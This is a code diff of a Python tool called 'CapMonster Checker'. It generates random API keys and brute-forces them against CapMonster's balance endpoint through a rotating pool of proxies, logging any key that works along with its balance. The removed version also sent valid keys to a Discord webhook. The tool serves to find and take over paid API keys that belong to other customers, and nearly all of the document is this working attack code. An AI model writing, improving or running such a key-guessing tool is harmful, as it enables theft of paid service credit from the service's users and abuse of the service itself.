@@ -1,171 +1,256 @@
-import httpx
-import os
+# Import required libraries
+import threading
+import queue
+import requests
 import random
 import string
-import time
-import json
-import concurrent.futures
-import logging
+import logging, json
+from colorama import Fore, init
+import os
+from json import JSONDecodeError
+from requests.exceptions import HTTPError
+from requests.exceptions import ProxyError, SSLError, HTTPError
 
-GENERATED_KEYS_FILE = "keys.txt"
-PROXIES_FILE = "proxies.txt"
-WEBHOOK_URL = "https://discord.com/api/webhooks/k44R5vKMuqk9HUsD5vi_7aitXmOcR"
 
-class CapMonsterChecker:
-    def __init__(self):
-        self.keys = []
-        self.use_proxies = False
-        self.proxies = []
-        self.logger = logging.getLogger("CapMonsterChecker")
-        self.logger.setLevel(logging.INFO)
-        formatter = logging.Formatter("[%(levelname)s] [%(asctime)s] - %(message)s")
-        ch = logging.StreamHandler()
-        ch.setFormatter(formatter)
-        self.logger.addHandler(ch)
-    
-    def generate_keys(self, num_keys, key_length):
-        chars = string.ascii_lowercase + string.digits
-        generated_keys = []
-        
-        for _ in range(num_keys):
-            key = ''.join(random.choice(chars) for _ in range(key_length))
-            generated_keys.append(key)
-        
-        return generated_keys
-    
-    def save_keys_to_file(self, keys):
-        with open(GENERATED_KEYS_FILE, 'w') as f:
-            for key in keys:
-                f.write(key + '\n')
-    
-    def load_keys_from_file(self):
-        if os.path.exists(GENERATED_KEYS_FILE):
-            with open(GENERATED_KEYS_FILE, 'r') as f:
-                self.keys = [line.strip() for line in f.readlines()]
-    
-    def load_proxies_from_file(self):
-        if os.path.exists(PROXIES_FILE):
-            with open(PROXIES_FILE, 'r') as f:
-                self.proxies = [line.strip() for line in f.readlines()]
-    
-    def ask_user_for_proxy_option(self):
-        answer = input("Do you want to use proxies? (y/n): ").lower()
-        self.use_proxies = answer.startswith('y')
-        if self.use_proxies:
-            self.load_proxies_from_file()  # Load proxies from the file
-    
-    def check_keys(self):
-        if not self.keys:
-            self.logger.warning("[!] No keys available. Generating new keys...")
-            self.generate_and_check_keys()
-            return
+def clear_screen():
+    """Clear the console screen."""
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-        self.logger.info(f"[*] Starting checker with {len(self.keys)} keys...")
+# Initialize colorama
+init(autoreset=True)
 
+# Initialize logging
+logging.basicConfig(filename='_Ggre55_capmonster_tool.log', level=logging.INFO,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Initialize queues for proxies and keys
+proxy_queue = queue.Queue()
+key_queue = queue.Queue()
+
+# Function to save valid proxies
+def save_valid_proxy(proxy):
+    with open('valid_proxies.txt', 'a+') as f:
+        f.write(f"{proxy}\n")
+
+
+# # Function to check if a proxy is valid
+# def check_proxy():
+#     while not proxy_queue.empty():
+#         proxy = proxy_queue.get()
+#         try:
+#             response = requests.get('https://capmonster.cloud', proxies={'http': proxy, 'https': proxy}, timeout=5)
+#             if response.status_code == 200:
+#                 logging.info(f'[Valid Proxy] {proxy}')
+#                 print(Fore.GREEN + f"[Valid Proxy] {proxy}")
+#                 save_valid_proxy(proxy)  # Save the valid proxy
+#             else:
+#                 logging.error(f'[Invalid Proxy] {proxy}')
+#                 print(Fore.RED + f"[Invalid Proxy] {proxy}")
+#         except requests.Timeout:
+#             logging.error(f'[Timeout] {proxy}')
+#             print(Fore.YELLOW + f"[Timeout] {proxy}")
+#         except requests.RequestException as e:
+#             logging.error(f'[Request Error] {proxy} - {e}')
+#             print(Fore.RED + f"[Request Error] {proxy} - {e}")
+#         except Exception as e:
+#             logging.error(f'[Unknown Error] {proxy} - {e}')
+#             print(Fore.MAGENTA + f"[Unknown Error] {proxy} - {e}")
+#         proxy_queue.task_done()
+
+
+
+
+# Function to check if a proxy is valid
+def check_proxy():
+    while not proxy_queue.empty():
+        proxy = proxy_queue.get()
         try:
-            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-                while True:
-                    futures = [executor.submit(self.check_key_with_retry, key, random.choice(self.proxies) if self.use_proxies else None)
-                               for key in self.keys]
-                    concurrent.futures.wait(futures, timeout=60)
-
-        except Exception as e:
-            self.logger.error(f"[ERROR] Exception in checker -> {e}")
-            time.sleep(60)  # Wait for 60 seconds before retrying
-
-    def check_key_with_retry(self, key, proxy, max_retries=3):
-        retries = 0
-        while retries < max_retries:
-            try:
-                self.check_key(key, proxy)
-                return
-            except httpx.TimeoutException:
-                self.logger.warning(f"Timeout while checking key {key}. Retrying... ({retries + 1}/{max_retries})")
-                retries += 1
-                time.sleep(5)  # Wait for 5 seconds before retrying
-        self.logger.error(f"Failed to check key {key} after {max_retries} retries.")
-
-    def check_key(self, key, proxy):
-        proxies = {"http": proxy, "https": proxy} if proxy else None
-        try:
-            checkResp = httpx.post(
-                "https://api.capmonster.cloud/getBalance",
-                json={"clientKey": key},
-                proxies=proxies,
-                timeout=30
-            )
-            if checkResp.status_code == 200:
-                balance = checkResp.json().get('balance')
-                if balance is not None:
-                    self.logger.info(f"Valid Key: {key} | Balance: {balance}")
-                    self.send_to_discord(key, balance)
-            elif checkResp.json().get('errorCode') == "ERROR_KEY_DOES_NOT_EXIST":
-                self.logger.info(f"Invalid Key: {key}")
+            response = requests.get('https://capmonster.cloud', 
+                                    proxies={'http': proxy, 'https': proxy}, 
+                                    timeout=5, 
+                                    verify=False)  # Disable SSL verification (not recommended for production)
+            if response.status_code == 200:
+                logging.info(f'[Valid Proxy] {proxy}')
+                print(Fore.GREEN + f"[Valid Proxy] {proxy}")
+                save_valid_proxy(proxy)  # Save the valid proxy
             else:
-                self.logger.error(f"Error checking key: {key} | {checkResp.status_code} | {checkResp.json()}")
-        except httpx.TimeoutException:
-            self.logger.error(f"Timeout while checking key {key}")
+                logging.error(f'[Invalid Proxy] {proxy}')
+                print(Fore.RED + f"[Invalid Proxy] {proxy}")
+        except ProxyError:
+            logging.error(f'[Proxy Error] {proxy}')
+            print(Fore.YELLOW + f"[Proxy Error] {proxy}")
+        except SSLError:
+            logging.error(f'[SSL Error] {proxy}')
+            print(Fore.YELLOW + f"[SSL Error] {proxy}")
+        except HTTPError as e:
+            logging.error(f'[HTTP Error] {proxy} - {e}')
+            print(Fore.RED + f"[HTTP Error] {proxy}")
         except Exception as e:
-            self.logger.error(f"Exception in checking key {key} -> {e}")
+            logging.error(f'[Unknown Error] {proxy} - {e}')
+            print(Fore.MAGENTA + f"[Unknown Error] {proxy}")
+        proxy_queue.task_done()
 
-    
-    def validate_proxies(self):
-        self.logger.info("Validating proxies...")
-        valid_proxies = []
-        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
-            futures = [executor.submit(self.check_key, '', proxy) for proxy in self.proxies]
-            for future in concurrent.futures.as_completed(futures):
-                proxy = future.result()
-                if proxy:
-                    valid_proxies.append(proxy)
-        self.proxies = valid_proxies
-    
-    def check_keys(self):
-        if not self.keys:
-            self.logger.warning("[!] No keys available. Generating new keys...")
-            self.generate_and_check_keys()
+# Function to generate a random CapMonster-like key
+def generate_key(length=32):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+# # Function to check if a CapMonster key is valid
+# def check_key():
+#     while not key_queue.empty():
+#         key = key_queue.get()
+#         try:
+#             # Make an API call to CapMonster
+#             response = requests.get(f'https://api.capmonster.cloud/check_key?key={key}', timeout=5).json()
+#             if response['status'] == 'success':  # Replace 'status' and 'success' with actual response keys
+#                 logging.info(f'[Valid Key] {key}')
+#                 print(f"[Valid Key] {key}")
+#             else:
+#                 logging.error(f'[Invalid Key] {key}')
+#                 print(f"[Invalid Key] {key}")
+#         except Exception as e:
+#             logging.error(f'[Error] {key} - {e}')
+#             print(f"[Error] {key} - {e}")
+#         key_queue.task_done()
+
+# Function to save API response
+def save_api_response(response, key):
+    with open(f'api_response_{key}.json', 'w') as f:
+        json.dump(response, f, indent=4)
+
+# Function to check if a CapMonster key is valid and also check its balance
+def check_key(proxy):
+    while not key_queue.empty():
+        key = key_queue.get()
+        try:
+            payload = json.dumps({"clientKey": key})
+            headers = {'Content-Type': 'application/json'}
+
+            # Making a POST request to get balance with a proxy
+            response = requests.post('https://api.capmonster.cloud/getBalance', 
+                                     headers=headers, data=payload, timeout=5, 
+                                     proxies={'http': proxy, 'https': proxy})
+            response.raise_for_status()  # Will raise HTTPError for bad responses
+            response_data = response.json()
+        
+            # Save the full API response
+            save_api_response(response_data, key)
+
+            # Extracting balance from the response
+            balance = response_data.get("balance", None)
+
+            if balance is not None:  # Replace with your actual validation logic
+                logging.info(f'[Valid Key] {key} - Balance: {balance} - Full Response: {json.dumps(response_data, indent=4)}')
+                print(Fore.GREEN + f"[Valid Key] {key} - Balance: {balance}\nFull Response: {json.dumps(response_data, indent=4)}")
+            else:
+                logging.error(f'[Invalid Key] {key} - Full Response: {json.dumps(response_data, indent=4)}')
+                print(Fore.RED + f"[Invalid Key] {key}\nFull Response: {json.dumps(response_data, indent=4)}")
+        except HTTPError as e:
+            if e.response.status_code == 401:
+                logging.error(f'[Unauthorized] {key} - 401 Unauthorized.')
+                print(Fore.YELLOW + f"[Unauthorized] {key} - 401 Unauthorized.\n")
+            else:
+                logging.error(f'[HTTP Error] {key} - {e}')
+                print(Fore.RED + f"[HTTP Error] {key}  - Check log file\n")
+        except JSONDecodeError:
+            logging.error(f'[JSON Decode Error] {key} - Invalid or empty JSON response.')
+            print(Fore.YELLOW + f"[JSON Decode Error] {key} - Invalid or empty JSON response.\n")
+        except requests.RequestException as e:
+            logging.error(f'[Request Error] {key} - {e}')
+            print(Fore.RED + f"[Request Error] {key}  - Check log file\n")
+        except Exception as e:
+            logging.error(f'[Unknown Error] {key} - {e}')
+            print(Fore.MAGENTA + f"[Unknown Error] {key}  - Check log file\n")
+            
+        key_queue.task_done()
+
+
+
+# Function to load items into a queue from a file
+def load_items_to_queue(file_path, item_queue):
+    try:
+        with open(file_path, 'r') as f:
+            items = f.readlines()
+        for item in items:
+            item_queue.put(item.strip())
+    except FileNotFoundError:
+        print("File not found. Please try again.")
+        exit(1)
+
+
+banner = f"""{Fore.CYAN}
+   ______            __  ___                 __               ________              __            
+  / ____/___ _____  /  |/  /___  ____  _____/ /____  _____   / ____/ /_  ___  _____/ /_____  _____
+ / /   / __ `/ __ \/ /|_/ / __ \/ __ \/ ___/ __/ _ \/ ___/  / /   / __ \/ _ \/ ___/ //_/ _ \/ ___/
+/ /___/ /_/ / /_/ / /  / / /_/ / / / (__  ) /_/  __/ /     / /___/ / / /  __/ /__/ ,< /  __/ /    
+\____/\__,_/ .___/_/  /_/\____/_/ /_/____/\__/\___/_/      \____/_/ /_/\___/\___/_/|_|\___/_/     
+          /_/           {Fore.RESET}{Fore.RED}BY Ggre55 {Fore.RESET}{Fore.GREEN}V1.2 {Fore.RESET}                                                                          
+                        {Fore.YELLOW}Telegram: @DrWoop {Fore.RESET}
+                        {Fore.YELLOW}Store: ggre55store.itch.io {Fore.RESET}
+"""
+
+# Main function for user interface and functionality
+def main():
+    # Clear the console screen for better readability
+    clear_screen()
+    print(f"{banner}")
+    print("                     1. Check Proxies")
+    print("                     2. Check Keys")
+    print("            ---------------------------------- ")
+    option = input("    * Select an option: ").strip()
+
+    if option == '1':
+        proxy_file = input("Enter path to proxy file: ").strip()
+        # try:
+        #     os.remove('valid_proxies.txt')
+        # except FileNotFoundError:
+        #     print(Fore.YELLOW + "No existing 'valid_proxies.txt' to remove.")
+        # # ... (existing code)
+        load_items_to_queue(proxy_file, proxy_queue)
+        num_threads = int(input("Enter number of threads: ").strip())
+        for _ in range(num_threads):
+            thread = threading.Thread(target=check_proxy)
+            thread.start()
+        proxy_queue.join()
+    elif option == '2':
+        # Load valid proxies
+        try:
+            with open('valid_proxies.txt', 'r') as f:
+                valid_proxies = f.readlines()
+            print(f"Loaded {len(valid_proxies)} valid proxies.")  # Debug print
+        except FileNotFoundError:
+            print("No valid proxies found. Please check proxies first(option 1).")
             return
         
-        self.logger.info(f"[*] Starting checker with {len(self.keys)} keys...")
+        # Load or generate keys
+        key_file = input("Enter path to key file (leave empty to generate keys): ").strip()
+        if key_file:
+            load_items_to_queue(key_file, key_queue)
+        else:
+            num_keys = int(input("Enter the number of keys to generate: ").strip())
+            for _ in range(num_keys):
+                key_queue.put(generate_key())
         
-        try:
-            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-                while True:
-                    futures = [executor.submit(self.check_key, key, random.choice(self.proxies) if self.use_proxies else None)
-                               for key in self.keys]
-                    concurrent.futures.wait(futures, timeout=60)
-        
-        except Exception as e:
-            self.logger.error(f"[ERROR] Exception in checker -> {e}")
-            time.sleep(60)  # Wait for 60 seconds before retrying
-        
-    def generate_and_check_keys(self):
-        keys = self.generate_keys(1000, 32)  # Generate 1000 new keys
-        self.save_keys_to_file(keys)
-        self.load_keys_from_file()
-        self.ask_user_for_proxy_option()  # Ask the user for proxy option
-        if self.use_proxies:
-            self.validate_proxies()
-        self.check_keys()
-    
-    def send_to_discord(self, key, balance):
-        data = {
-            "content": f"Valid Key: {key} | Balance: {balance}"
-        }
-        headers = {
-            "Content-Type": "application/json"
-        }
-        
-        try:
-            response = httpx.post(WEBHOOK_URL, json.dumps(data), headers=headers)
-            if response.status_code == 204:
-                self.logger.info("Message sent to Discord webhook")
-            else:
-                self.logger.error(f"Error sending message to Discord webhook: {response.status_code} - {response.text}")
-        except Exception as e:
-            self.logger.error(f"Exception in sending to Discord: {e}")
+        print(f"Loaded {key_queue.qsize()} keys.")  # Debug print
 
-if __name__ == "__main__":
-    checker = CapMonsterChecker()
-    checker.load_keys_from_file()
-    checker.check_keys()
+        num_threads = int(input("Enter number of threads: ").strip())
+        
+        # Start threads using valid proxies for key checking
+        for proxy in valid_proxies:
+            for _ in range(num_threads):
+                thread = threading.Thread(target=check_key, args=(proxy.strip(),))
+                thread.start()
+        key_queue.join()
+
+    else:
+        print("Invalid option. Please try again.")
+        exit(1)
+
+    print("=== Task Completed ===")
+    
+# Run the main function
+if __name__ == '__main__':
+    main()
+
+
+
+#Made by ggre55
